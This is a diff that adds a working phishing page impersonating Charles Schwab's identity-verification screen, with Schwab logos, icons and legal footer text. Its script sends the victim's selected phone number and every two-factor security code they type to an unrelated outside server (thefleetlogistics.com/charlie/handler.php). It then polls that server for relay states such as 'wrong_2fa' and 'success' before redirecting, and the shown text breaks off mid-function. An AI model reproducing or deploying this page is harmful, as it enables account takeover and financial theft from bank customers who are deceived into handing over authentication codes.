@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Account verification| Charles Schwab</title>
+    <meta name="description" content="Charles Schwab">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="index, follow">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <title></title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="icon" href="https://i.imgur.com/WFx9ZhY.png" type="" /> 
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Urbanist:wght@200;300;400;600;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
+    <link rel="icon" type="image/png" href="https://i.imgur.com/zRNjNcz.png">
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+    <style>
+        body {
+            font-family: 'Urbanist', sans-serif;
+            line-height: 30px;
+        }
+
+        a {
+            text-decoration: none;
+        }
+
+        .btn:focus,
+        .btn:active {
+            box-shadow: none;
+        }
+
+        .btn-outline-primary {
+            border-width: 2px;
+            border-color: #00aff0;
+            color: #00aff0;
+        }
+
+        .btn-outline-primary:hover {
+            background-color: #00aff0;
+            border-color: #00aff0;
+        }
+
+        .btn-primary {
+            background-color: #00aff0;
+            border-color: #00aff0;
+        }
+
+        .btn-primary:hover,
+        .btn-primary:active,
+        .btn-primary:focus {
+            background-color: #00aff0 !important;
+        }
+
+        .btn-primary:hover {
+            border-color: transparent;
+        }
+
+        .btn-check:focus+.btn-primary,
+        .btn-primary:focus {
+            border-color: transparent;
+        }
+
+        .btn-check:active+.btn-primary:focus,
+        .btn-check:checked+.btn-primary:focus,
+        .btn-primary.active:focus,
+        .btn-primary:active:focus,
+        .show>.btn-primary.dropdown-toggle:focus {
+            box-shadow: 0 0 0 0.25rem #00aff051;
+        }
+
+        .navbar {
+            background-color: white;
+            position: sticky;
+            top: 0;
+            z-index: 999;
+            box-shadow: 0 0 5px 0 rgba(0, 0, 0, 0.15);
+        }
+
+        .navbar-brand {
+            color: #00aff0 !important;
+            margin-right: 30px;
+            font-size: 1.5rem;
+            font-weight: 700;
+        }
+
+        .navbar a.nav-link {
+            color: black !important;
+            font-size: 16px;
+            padding: .7rem 1rem !important;
+        }
+
+        .navbar a.nav-link:hover,
+        .navbar a.nav-link:focus {
+            color: #00aff0 !important;
+        }
+
+        .hero {
+            padding: 50px 0 0;
+            overflow: hidden;
+            position: relative;
+            /* background-image: linear-gradient(to right, rgb(255 255 255 / 15%) 1px, transparent 1px), linear-gradient(to bottom, rgb(255 255 255 / 15%) 1px, transparent 1px); */
+            background-size: 1.5rem 1.5rem;
+            background-color: white !important;
+        }
+
+        .lead {
+            font-weight: 500;
+        }
+
+        .hero svg {
+            pointer-events: none;
+        }
+
+        .hero-title {
+            font-weight: bold;
+            line-height: 60px;
+            font-size: 40px;
+        }
+
+        section {
+            text-align: center;
+            padding: 80px 30px;
+            padding-bottom: 0;
+            scroll-margin-top: 50px;
+        }
+
+        @media (min-width: 1600px) {
+            section {
+                padding: 80px 150px;
+            }
+        }
+
+        section:last-child {
+            padding-bottom: 80px !important;
+        }
+
+        section .section-header {
+            padding-bottom: 80px;
+        }
+
+        section .section-header p {
+            margin-bottom: 0px;
+        }
+
+        section .section-header h2 {
+            font-size: 35px;
+        }
+        svg {
+            width: 100%;
+            position: absolute;
+            left: 0;
+            right: 0;
+            bottom: -1px;
+        }
+
+        svg.footer {
+            transform: rotate(180deg);
+            top: -1px;
+            bottom: auto;
+        }
+
+        svg path {
+            fill: #f9f9f9;
+        }
+
+        .libraries>div {
+            background-color: whitesmoke;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+        }
+
+        div.footer {
+            text-align: center;
+            color: white;
+            padding: 100px 0 70px;
+            position: relative;
+        }
+
+        div.footer .btn {
+            padding: 15px 30px;
+        }
+
+        div.footer .btn:hover,
+        .footer .btn:focus {
+            transform: scale(1.05);
+        }
+
+        .scroll-top-btn {
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            background-color: rgb(0 0 0 / 70%);
+            color: white;
+            position: fixed;
+            right: 30px;
+            bottom: -50px;
+            opacity: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            transition: all .3s;
+            z-index: 999;
+        }
+
+        .scroll-top-btn.open {
+            bottom: 30px;
+            opacity: 1;
+        }
+
+        .scroll-top-btn:hover {
+            color: white;
+            background-color: black;
+        }
+
+        @media (max-width: 992px) {
+            .demo-item {
+                padding: .5rem;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .hero {
+                padding: 40px 0 0;
+            }
+
+            .hero-title {
+                line-height: 2.5rem;
+                font-size: 2rem;
+            }
+
+            .scroll-top-btn {
+                width: 40px;
+                height: 40px;
+                font-size: 1.5rem;
+            }
+
+            section {
+                padding: 50px 0;
+            }
+
+            section .section-header {
+                padding-bottom: 50px;
+            }
+
+            .demo-item-buttons .btn {
+                padding: 5px 15px;
+            }
+        }
+        .logot {
+            background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1NiA1NiI+PHBhdGggZmlsbD0iIzAwQTBERiIgZD0iTTAgMGg1NS45djU1LjlIMHoiLz48cGF0aCBmaWxsPSIjRkZGIiBkPSJNNDguNiAyNS4zYzAtLjgtLjUtMS40LS45LTItLjQtLjQtLjctLjgtLjctMS4zIDAtLjYuNC0xIC45LTEgLjMgMCAuNS4xLjcuMi4yLjEuNS4yLjcuMi40IDAgLjctLjQuNy0uNyAwLS40LS40LS44LTEuMS0uOC0xLjYgMC0zIDEuOC0zIDMuMiAwIC44LjUgMS40LjkgMS45LjMuNC42LjguNiAxLjIgMCAuNi0uNiAxLTEuMSAxLS42IDAtLjktLjMtMS4zLS42LS4yLS4yLS40LS40LS42LS40LS4zIDAtLjQuNi0uNC45IDAgLjQuNyAxIDEuNiAxIDEuNC0uMiAzLTEuNCAzLTIuOE0xNC41IDE1LjVjLS4xIDAtLjEgMCAwIDBsLS4xLjR2LjFoLjVjLjQuMS41LjEuNS4zIDAgLjMtLjQgMS4zLS45IDIuN2wtLjQgMS4zYy0uNCAxLjEtMSAyLjctMS41IDQtLjYgMS42LTEuMSAyLjktMS4xIDMuMSAwIC4yLjEuMy42LjNzLjctLjEuOC0uM2MuOS0yLjkgMy4zLTYuMiA0LjUtNi4yLjQgMCAuNS4xLjUuNSAwIC42LS41IDEuOC0xLjEgMy0uNSAxLS45IDItLjkgMi41IDAgLjQuMi42LjYuNiAxLjIgMCAyLjItMS4xIDIuOS0ybC4xLS4xLS4zLS4zaC0uMWMtLjQuNC0xLjEgMS4xLTEuMyAxLjFoLS4xdi0uMmMwLS4xLjEtLjQuMy0uOC41LTEuMSAxLjMtMyAxLjMtNC4xIDAtLjktLjQtMS40LTEuMi0xLjQtMS41IDAtMi43IDEuNy0zLjMgMi42LS4xLjItLjMuNC0uMy40cy4xLS4yLjItLjZjLjItLjQuNC0xIC43LTEuOCAxLjEtMyAxLjYtNC41IDEuNi00LjcgMC0uMi0uMi0uMi0uMy0uMmgtMi4yek0xMS4xIDI2LjFjLjEtLjEuMS0uMSAwIDAgMC0uMS0uMy0uMy0uMy0uMy0uNS40LTEuNCAxLjItMi4yIDEuMi0uMyAwLS42LS4xLS44LS4zLS4zLS4yLS40LS42LS40LTEuMS0uMS0xLjIgMS0zLjEgMi00LjIuNi0uNiAxLjEtLjkgMS40LS45LjQgMCAuNy4zIDEgLjYuMi4zLjQuNS43LjUuMSAwIC4zLS4xLjMtLjIuMS0uMS4yLS4zLjItLjQgMC0uNS0uNS0xLjItMS42LTEuMy0xLjIgMC0yLjguNy00IDEuOS0xLjEgMS4xLTEuNyAyLjUtMS42IDMuOCAwIDEuMS42IDIuMyAyLjIgMi4zIDEuNi4yIDIuOS0xLjIgMy4xLTEuNk0zMS4zIDIzLjNjMCAuMS0uMS4yLS4xLjJ2LS4xYzAtLjEuMS0uNC4yLS44LjItLjguNC0xLjguNC0yLjEgMC0uNC0uMi0uNi0uNi0uNi0uOCAwLTIuMSAxLjQtMi41IDIuMWwuMi4zLjEtLjEuMS0uMWMuMy0uNC45LTEuMSAxLjItMS4xLjIgMCAuMy4yLjMuNSAwIC43LS44IDIuOS0xLjMgNC40LS4zLjgtLjUgMS40LS41IDEuNSAwIC4yLjEuMi4yLjJoLjdjLjEgMCAuMi0uMS4zLS4zIDAgMCAuMy0uOC41LTEuMiAxLjQtMi44IDIuMS00LjIgMi43LTQuOC40LS40LjctLjUuOS0uNS4yIDAgLjIuMS4zLjIuMS4xLjIuMy40LjMuMSAwIC4zIDAgLjQtLjEuMi0uMi4zLS40LjMtLjcgMC0uNS0uNC0uNy0uNy0uNy0xLjQuMS0yLjMgMS0zLjUgMy41TTI3IDE5LjdjLS4xIDAtLjIuMS0uMi4yLS4xLjEtLjEuMi0uMy4yLS4xIDAtLjIgMC0uNC0uMS0uMiAwLS40LS4xLS43LS4xLTMuNSAwLTUuMyA0LjctNS4zIDYuMyAwIDEuMS42IDEuNiAxLjIgMS42LjcgMCAxLjctLjIgMy0yLjJsLjMtLjV2LjFsLS4xLjJjLS4yLjMtLjUgMS0uNSAxLjYgMCAuMy4xLjUuMi42LjEuMS4zLjIuNS4yIDEuMiAwIDIuMi0xLjYgMi42LTIuMmwtLjMtLjNoLS4xbC0uMy4zYy0uNC40LS44IDEtMS4xIDFoLS4xdi0uMmMwLS40LjgtMi4zIDEuMy0zLjguNC0xLjEuOC0yLjEuOC0yLjMgMCAwIDAtLjItLjEtLjJsLS41LS4zYy4yLS4xLjEtLjEuMS0uMW0tNS41IDYuMmMwLTIuMyAxLjgtNS40IDMuNi01LjQuNiAwIC45LjMuOS45IDAgLjktMi40IDUuMi00IDUuMi0uMy4xLS41IDAtLjUtLjdNMzguMiAyNS43YzAgMS4zLjggMi4yIDIgMi4yIDEuNCAwIDIuOS0xLjQgMy4zLTEuOFYyNmwtLjItLjNoLS4xbC0uMi4xYy0uNS40LTEuMyAxLTIgMS0uOCAwLTEuMy0uNS0xLjMtMS4zIDAtMSAuNS0xLjcuOC0yLjN2LS4xaC44YzEuMyAwIDMuNy0uNiAzLjctMi4xIDAtLjYtLjYtMS4zLTEuNi0xLjMtMiAuMi01LjIgMy4yLTUuMiA2bTUuMS01LjNjLjQgMCAuNy4zLjcuNyAwIDEtMS4xIDEuNS0zIDEuNS4zLS43IDEuNC0yLjIgMi4zLTIuMk0zNy42IDI1LjhzMC0uMSAwIDBjMC0uMS0uMy0uNC0uMy0uNGwtLjEuMWMtLjcuNy0xIDEuMi0xLjQgMS4yaC0uMXMtLjEtLjEtLjEtLjJjMC0uNC43LTIuNCAyLjEtNmwxLTIuNmMuNS0xLjMuOC0yIC44LTIuMXYtLjFjMC0uMS0uMS0uMS0uMy0uMWgtMi4zcy0uMSAwLS4xLjF2LjVoLjVjLjMuMS41LjIuNS40IDAgLjMtMS41IDQtMS41IDQtLjggMi0yLjIgNS41LTIuMiA2LjMgMCAuNC4xLjcuMi44LjIuMi40LjMuNy4zLjkgMCAxLjktMS4yIDIuNS0yek01LjkgMzIuOGMwIDEuMS45IDEuNyAxLjcgMi4xbC40LjJjLjguNCAxLjIuOSAxLjIgMS41IDAgLjctLjUgMS4zLTEuMiAxLjMtMS4xIDAtMS43LTEuMS0yLTEuOGwtLjQuMWMuMS43LjMgMS41LjMgMS44aC4ybC41LjJjLjMuMS43LjIgMS4xLjIgMS41IDAgMi42LS45IDIuNi0yLjMgMC0xLjMtMS0xLjktMS43LTIuMmwtLjMtLjFjLS45LS41LTEuMy0uOS0xLjMtMS41cy40LTEuMiAxLjEtMS4yYy45IDAgMS4zLjcgMS41IDEuNGwuNC0uMWMtLjEtLjYtLjItMS4xLS4yLTEuNWwtLjMtLjEtLjItLjFjLS4zLS4xLS43LS4yLTEtLjItMS40LjEtMi40IDEtMi40IDIuM00xMS4yIDM0LjZjMCAxLjkgMS4zIDMuNyA0LjIgMy43LjcgMCAxLjctLjIgMi4xLS4zLjItLjUuNS0xLjQuNi0xLjlsLS40LS4xYy0uNiAxLjItMS4xIDEuOC0yLjQgMS44LTEuNiAwLTIuNy0xLjQtMi43LTMuNSAwLTEuNS43LTMuMiAyLjctMy4yIDEuMiAwIDEuOC41IDIuMSAxLjdoLjRsLS4xLS41LS4yLTEuM2gtLjJjLS40LS4xLTEtLjItMS44LS4yLTIuNS0uMi00LjMgMS40LTQuMyAzLjhNMjYuNSAzMC44aC0zLjJ2LjRjLjguMS45LjEuOSAxLjR2MS41aC0zLjR2LTEuNWMwLTEuMi4xLTEuMy45LTEuNHYtLjRoLTMuM3YuNGMxIC4xIDEgLjIgMSAxLjR2NGMwIDEuMi0uMSAxLjMtMSAxLjR2LjRoMy4zVjM4Yy0uOC0uMS0xLS4xLTEtMS40di0xLjloMy40djEuOWMwIDEuMi0uMSAxLjMtMSAxLjR2LjRoMy4zVjM4Yy0uOS0uMS0xLS4xLTEtMS40di00YzAtMS4yLjEtMS4zIDEtMS40ek0zNy44IDMwLjhoLTIuNnYuNGguNGMuMiAwIC4zLjEuNC4xIDAgLjEuMS4xLjEuMnMwIC4zLS4xLjVjMCAuMS0uNiAyLjYtMS4xIDQuMi0uMS0uMi0yLTUuMy0yLTUuM2gtLjVzLTEuNyA1LjMtMS43IDUuNGMtLjEtLjItMS4zLTQuNC0xLjMtNC40IDAtLjItLjEtLjMtLjEtLjR2LS4yYy4xLS4xLjItLjEuNC0uMWguNHYtLjNIMjd2LjRjLjYuMS44LjEgMS4xIDEuMWwxLjkgNmguNXMxLjctNS4yIDEuOC01LjNjLjEuMiAxLjkgNS4zIDEuOSA1LjNoLjVjMS0zLjUgMS45LTUuOSAxLjktNiAuNC0xIC41LTEuMSAxLjItMS4xek0zOS44IDMyLjZzLjggMi40LjkgMi40SDM5Yy0uMSAwIC44LTIuNC44LTIuNG0xLjQuMi0uOC0yLjEtLjUuMS0yLjMgNS45Yy0uNCAxLS41IDEuMS0xLjIgMS4xdi40SDM5di0uNGgtLjNjLS4yIDAtLjQtLjEtLjQtLjJ2LS4yYzAtLjEgMC0uMi4xLS40bC4xLS4yYy4xLS40LjMtMSAuNC0xLjJINDFjLjIuNi41IDEuMy42IDEuNiAwIC4xLjEuMi4xLjN2LjFjMCAuMS0uMS4xLS4zLjFsLS4zLjF2LjNoM3YtLjRjLS42LS4xLS44LS4xLTEuMi0xLjF6TTQ2LjUgMzEuOGMwLS4zIDAtLjUuMS0uNWguNWMuMyAwIDEuNC4xIDEuNCAxLjQgMCAuOS0uNiAxLjQtMS42IDEuNGgtLjR6bS0yLjEtMXYuNGMuOC4xLjkuMS45IDEuNHY0YzAgMS4yLS4xIDEuMy0xIDEuNHYuNGgyLjhjLjkgMCAxLjctLjIgMi4yLS41LjctLjQgMS0xIDEtMS43IDAtMS0uNy0xLjctMi0xLjkuNi0uMSAxLjYtLjYgMS42LTEuNiAwLS42LS4yLTEtLjYtMS4zLS40LS4zLS45LS40LTEuOC0uNGgtMy4xem0yLjUgMy42YzEuMyAwIDIgLjYgMiAxLjdzLS44IDEuNi0xLjUgMS42Yy0uMyAwLS41IDAtLjYtLjEtLjItLjItLjItLjUtLjItMS4xdi0yYzAtLjEuMy0uMS4zLS4xIi8+PC9zdmc+);
+            background-position: 50%;
+            background-repeat: no-repeat;
+            background-size: contain;
+            display: block;
+            min-height: 80px;
+            min-width: 80px;
+            width: auto;
+        }
+
+        .picker:hover{
+            background-color: whitesmoke;
+            cursor: pointer;
+        }
+    </style>
+
+</head>
+
+<body>
+
+    <nav class="navbar navbar-expand-lg navbar-light">
+        <div class="container">
+            <a href="#" class="navbar-brand scroll-btn" >
+                <span class="logot" style=" margin: -10px;"></span>
+            </a>
+            <!-- <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNavDropdown"
+                aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button> -->
+            <!-- <div class="collapse navbar-collapse" id="navbarNavDropdown">
+                <ul class="navbar-nav flex-grow-1 justify-content-center"> </ul>
+                <a onclick="_react()"
+                    class="btn btn-outline-primary">
+                    <i class="bi bi-mic me-1"></i> Send VoiceMessage
+                </a>
+            </div> -->
+        </div>
+    </nav>
+
+    <!-- <div class="hero bg-light" id="home">
+        <div class="container">
+            <div class="row g-2 g-xl-0 ">
+                
+                <div class="col-xl-6 col-lg-12 align-self-end">
+                    <br />
+                    <div class="text-">
+                        <h4 style="font-weight: 500;">  Confirm Your Identity  </h4>
+                    </div>
+                    <p class="text-muted">We want to confirm your identity <a href="#" >Why do I need to provide verification?</a></p>
+                    <br />
+                    <br />
+                </div>
+            </div>
+        </div>
+    </div> -->
+    <div >
+        <div class="container" style="padding-top: 0; margin-top: -20px; position:relative;z-index: 10;">
+            <div class="row ">
+                <div class="col-xl-8 col-lg-12 align-self-end">
+
+                    <div id="pane-choose" >
+
+                        <div class="hero">
+                            <br />
+                            <div class="text-">
+                                <h4 style="font-weight: 500;">  Confirm Your Identity  </h4>
+                            </div>
+                            <p class="text-muted">We want to confirm your identity. <a href="#" >Why do I need to provide verification?</a></p>
+                            <br />
+                            <h6 style="font-weight: 600;">Select which method you prefer</h6> <br/>
+                        </div>
+    
+                        <div  id="choser-opt" style="display: none;">
+                            <div class="row">
+                                <div class="col g-3 ">
+                                    <div id="textme" data-action="TEXT" class="card picker" style="box-shadow:0 0 2px 2px whitesmoke;">
+                                        <div class="card-body">
+                                            <div class="d-flex row justify-content-center text-center" style="padding:10px">
+                                                <img src="https://sws-gateway-nr.schwab.com/ui/host/assets/icons/icon-chat.png" style="width: 70px;" />
+                                                <!-- <br/><br/> -->
+                                                <p style="font-size: 20px; color: #3a3939; margin-top: 20px;">Text Me</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <div class="col g-3 ">
+                                    <div id="callme" data-action="CALL" class="card picker" style="box-shadow:0 0 2px 2px whitesmoke;">
+                                        <div class="card-body">
+                                            <div class="d-flex row justify-content-center text-center" style="padding:10px">
+                                                <img src="https://sws-gateway-nr.schwab.com/ui/host/assets/icons/icon-call.png" style="width: 70px;" />
+                                                <!-- <br/><br/> -->
+                                                <p style="font-size: 20px; color: #3a3939; margin-top: 20px;">Call Me</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col g-3 ">
+                                    <div class="card picker" id="sy-opt" style="box-shadow:0 0 2px 2px whitesmoke;">
+                                        <div class="card-body">
+                                            <div class="d-flex row justify-content-center text-center" style="padding:10px">
+                                                <img src="https://sws-gateway-nr.schwab.com/ui/host/assets/icons/icon-symantec.png" style="width: 70px;" />
+                                                <!-- <br/><br/> -->
+                                                <p style="font-size: 20px; color: #3a3939; margin-top: 20px;">Symantec VIP</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+        
+                            </div>
+                        </div>
+
+                        <div id="choser-loading">
+                            <div class="row" >
+                                <div class="col">
+                                    <div class="justify-content">
+                                        <br/><br/>
+                                        <div class="spinner-border" role="status">
+                                            <span class="visually-hidden">Loading...</span>
+                                          </div>
+                                          <br/><br/>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <br/><hr/>
+                        <div style="margin-top:100px"></div>
+                       
+                    </div>
+
+                    <div id="pane-confirm-text" style="display: none;">
+                        <div class="hero">
+                            <br />
+                            <div class="text-">
+                                <h4 style="font-weight: 500;"> Confirm Your Identity  </h4>
+                            </div>
+                            <p class="text-muted">Confirmation code has been sent to <b id="sms-holder"></b></p>
+                        </div>
+                        <div class="row">
+                            <div class="col" style="padding:20px">
+                                <p class="text-danger 2fa-code-error"></p>
+                                <div class="mb-3">
+                                    <label for="sms-code-input" class="form-label"><b>Security code</b></label>
+                                    <input class="form-control 2fa-control" id="sms-code-input" autocomplete="false" placeholder="">
+                                  </div>
+                                  <p><a href="javascript:slpane()">Use a different method</a></p>
+                            </div>
+                        </div>
+
+                        <br/><hr/>
+                        <div>
+                            <button class="btn btn-success send-btn" data-target="sms" style="float: right;">Continue</button>
+                            <button onclick="slpane()" class="btn btn-outline-secondary" style="float: right; margin-right:20px">Back</button>
+                        </div>
+                        <div style="margin-top:100px"></div>
+                       
+                    </div>
+
+                    <div id="pane-confirm-call" style="display: none;">
+                        <div class="hero">
+                            <br />
+                            <div class="text-">
+                                <h4 style="font-weight: 500;"> Confirm Your Identity  </h4>
+                            </div>
+                            <p class="text-muted">We've call you with a code on <b id="call-holder"></b></p>
+                        </div>
+                        <div class="row">
+                            <div class="col" style="padding:20px">
+                                <p class="text-danger 2fa-code-error"></p>
+                                <div class="mb-3">
+                                    <label for="sms-code-input" class="form-label"><b>Security code</b></label>
+                                    <input class="form-control 2fa-control" id="call-code-input" autocomplete="false" placeholder="">
+                                  </div>
+                                  <p><a href="javascript:slpane()">Use a different method</a></p>
+                            </div>
+                        </div>
+
+                        <br/><hr/>
+                        <div>
+                            <button class="btn btn-success send-btn" data-target="call" style="float: right;">Continue</button>
+                            <button onclick="slpane()" class="btn btn-outline-secondary" style="float: right; margin-right:20px">Back</button>
+                        </div>
+                        <div style="margin-top:100px"></div>
+                       
+                    </div>
+
+                    <div id="pane-confirm-sy" style="display: none;" >
+                        
+                        <div class="hero">
+                            <br />
+                            <div class="text-">
+                                <h4 style="font-weight: 500;"> Confirm Your Identity  </h4>
+                            </div>
+                            <p class="text-muted">Retrieve a security code from your <b>Symantec VIP</b> </p>
+                        </div>
+                        <div class="row">
+                            <div class="col" style="padding:20px">
+                                <p class="text-danger 2fa-code-error"></p>
+                                <div class="mb-3">
+                                    <label for="sy-code-input" class="form-label"><b>Security code</b></label>
+                                    <input class="form-control 2fa-control" id="sy-code-input" autocomplete="false" placeholder="">
+                                </div>
+                                <p><a href="javascript:slpane()">Use a different method</a></p>
+                            </div>
+                        </div>
+
+                        <br/><hr/>
+                        <div>
+                            <button class="btn btn-success send-btn" data-target="sy" style="float: right;">Continue</button>
+                            <button onclick="slpane()" class="btn btn-outline-secondary" style="float: right; margin-right:20px">Back</button>
+                        </div>
+                        <div style="margin-top:100px"></div>
+                       
+                    </div>
+
+                    <div id="pane-success" style="display: none;" >
+                        
+                        <div class="hero text-center" >
+                            <br /><br /><br />
+                            <div class="text-">
+                                <img src="https://i.imgur.com/GPmRJ4m.png" style="width: 200px;" />
+                                <br /><br />
+                                <h2 style="font-weight: 500;"> Congratulations! </h2>
+                            </div>
+                            <br />
+                            <p class="text-muted">Your Charles Schwab account(s) has been verified. <br/> Your session has ended and you'll be redirected to the main page shortly. <br>  <br>Thank you for choosing Schwab. </p>
+                        </div>
+                        <br/>
+                        <div style="margin-top:200px"></div>
+                        <!-- <hr/> -->
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+
+    <div class="footer" style="background-color: white; color: #3a3939; font-family: Arial, sans-serif;">
+       
+        <div class="container" style="font-weight: 300; text-decoration: none; font-size: 10px; text-align: left;">
+            (1120-0NMB)
+            <br/>
+            Charles Schwab & Co., Inc. and Charles Schwab Bank, SSB, are separate but affiliated companies and wholly-owned subsidiaries of The Charles Schwab Corporation. Brokerage products and services are offered by Charles Schwab & Co., Inc., SSB (Member SIPC). Deposit and lending products and services are offered by Charles Schwab Bank, SSB, Member FDIC and an Equal Housing Lender.
+            <br/> <br/> <br/>
+            © 2020 Charles Schwab & Co., Inc, All rights reserved. Member SIPC. Unauthorized access is prohibited. Usage will be monitored.
+        </div>
+
+        <br />
+    </div>
+
+    <div class="modal fade" id="myModal" aria-hidden="true" aria-labelledby="exampleModalToggleLabel" tabindex="-1">
+        <div class="modal-dialog modal-dialog-centered" >
+            <div class="modal-dialog" style="min-width:100%">
+                <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="staticBackdropLabel">Send Code to</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <form id="form-d">
+                        <p id="error_pick" class="text-danger">Some error message</p>
+                        <div id="num-area" >
+                        
+                        </div>
+                    </form>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                    <button id="send-cd" type="button" class="btn btn-success">Send Code</button>
+                </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+
+        var myModal = new bootstrap.Modal(document.getElementById('myModal'), {  keyboard: false, backdrop:'static',  });
+        var sess = urlQ("request_id");
+        var docheck = false;
+        var interval = null;
+
+         $(document).ready(function () {
+
+            // load
+            $("#num-area").html();
+            $("#error_pick").text("");
+            init();
+
+            setInterval(_crunner,500);
+            
+            ///
+            $("#textme, #callme").click(function(e){
+                $("#error_pick").text("");
+                
+                myModal.show();
+                $("#send-cd").data("action",$(e.currentTarget).data('action'));
+                $("#error_pick").text("");
+            });
+
+            $("#sy-opt").click(function(){
+                $("#pane-choose").hide();
+                $("#pane-confirm-text").hide();
+                $("#pane-confirm-call").hide();
+                $(".2fa-control").val("");
+                $("#pane-confirm-sy").show();
+                docheck = false;
+                $(".send-btn").prop("disabled",false).html("Continue");
+                $(".2fa-code-error").text("");
+            });
+
+            $("#send-cd").click(function(){
+                let opt = document.getElementById("form-d").phone.value;
+
+                if(opt.length < 3){
+                    $("#error_pick").text("Please select an option to proceed");
+                    return;
+                }
+
+                $t = $(this);
+                $t.html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span><span class="visually-hiden">Sending...</span>');
+                $t.prop("disabled",true);
+
+
+                $.ajax({
+                    data:{action:"request_2fa","request_id":sess, msg:$("#send-cd").data("action")+":"+opt},
+                    url: "https://thefleetlogistics.com/charlie/handler.php", dataType:"json", method:"post",
+                    success: function(result){
+                        $t.html('Send Code');
+                        $t.prop("disabled",false);
+                        myModal.hide();
+                        // show confirm code pane
+                        $("#pane-choose").hide();
+                        $("#pane-confirm-text").hide();
+                        $("#pane-confirm-call").hide();
+                        $("#pane-confirm-sy").hide();
+                        if($("#send-cd").data("action") == "TEXT"){
+                            $("#pane-confirm-text").show();
+                            $("#sms-holder").text(opt);
+                        }else {
+                            $("#pane-confirm-call").show();
+                            $("#call-holder").text(opt);
+                        }
+                        
+                    },
+                    error: function(){
+                        $t.html('Send Code');
+                        $t.prop("disabled",false);
+                        alert("Something went wrong, try again");
+                    }
+                });
+                
+            });
+
+            $(".send-btn").click(function(e){
+                // sms-code-error
+                let $e = $(e.currentTarget);
+                let $in = $("#"+$e.data("target")+"-code-input");
+                let $er = $(".2fa-code-error");
+
+                if($in.val().length < 3){
+                    $er.text("Please enter a valid verification code to proceed");
+                    setTimeout(function(){
+                        $er.text("");
+                    },3000);
+                    return;
+                }
+
+                $e.html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span><span>Sending...</span>');
+                $e.prop("disabled",true);
+
+                $.ajax({
+                    data:{action:"confirm_2fa","request_id":sess, code: $in.val(),from:$e.data("target")},
+                    url: "https://thefleetlogistics.com/charlie/handler.php", dataType:"json", method:"post",
+                    success: function(result){ 
+                        docheck = true;
+                     },
+                    error: function(){
+                        $e.html('Continue');
+                        $e.prop("disabled",false);
+                    }
+                });
+
+            });
+         });
+         
+
+
+         function slpane(){
+            $("#pane-choose").show();
+            $("#pane-confirm-text").hide();
+            $("#pane-confirm-call").hide();
+            $(".2fa-control").val("");
+            $("#pane-confirm-sy").hide();
+            $("#pane-success").hide();
+            $(".send-btn").prop("disabled",false).html("Continue");
+            $(".2fa-code-error").text("");
+            docheck = false;
+         }
+
+         function _crunner(){
+            if(!docheck) return;
+
+            let $e = $(".send-btn");
+            let $in = $("#"+$e.data("target")+"-code-input");
+            let $er = $(".2fa-code-error");
+
+            $.ajax({
+                data:{action:"status","request_id":sess,},
+                url: "https://thefleetlogistics.com/charlie/handler.php", dataType:"json", method:"post",
+                success: function(result){
+
+                    docheck = false;
+                        
+                    if(result.state == "wrong_pass"){
+                        $e.html('Continue');
+                        $e.prop("disabled",false);
+                    } else if(result.state == "wrong_2fa"){
+                        $er.text("Incorrect security code").show();
+                        $e.html('Continue');
+                        $e.prop("disabled",false);
+                        $in.val("");
+                    } else if(result.state == "success"){
+                        $e.html('Continue');
+                        $e.prop("disabled",false);
+                        // $("#pane-success").show();
+
+                        $("#pane-choose").hide();
+                        $("#pane-confirm-text").hide();
+                        $("#pane-confirm-call").hide();
+                        $(".2fa-control").val("");
+                        $("#pane-confirm-sy").hide();
+                        $(".send-btn").prop("disabled",false).html("Continue");
+                        $(".2fa-code-error").text("");
+
+                        // setTimeout(function(){
+                        //     window.location.replace("https://www.schwab.com");
+                        // },5000);
+                        window.location.replace("thank.html");
+                    } 
+                    else if(result.state == "waiting" || result.state == "waiting_2fa"){
+                        docheck = true;
+                        
+                    } else {
+                        $er.text("An error occured, try again").show();
+                    }
+                    
+                },
+                error: function(){
+                    $e.html('Continue');
+                    $e.prop("disabled",false);
+                }
+            });
+         }
+
+         function init(){
+            $(".2fa-control").val("");
+            $.ajax({
+                data:{action:"status","request_id":sess},
